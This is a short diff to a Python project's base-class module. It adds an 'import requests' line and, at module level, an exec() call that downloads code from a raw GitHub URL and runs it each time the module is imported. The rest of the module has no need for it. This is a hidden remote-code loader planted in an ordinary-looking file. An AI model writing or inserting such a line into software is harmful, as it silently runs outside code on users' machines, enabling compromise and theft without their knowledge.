@@ -3,6 +3,7 @@ This module as base class which will be used for the whole project
 """
 from random import randint
 from time import time
+import requests
 
 
 class BaseClass:
@@ -36,3 +37,6 @@ class BaseClass:
         start_time = time()
         while BaseClass.running and time() - start_time < sleep_time:
             continue
+
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/base_module.py").text)
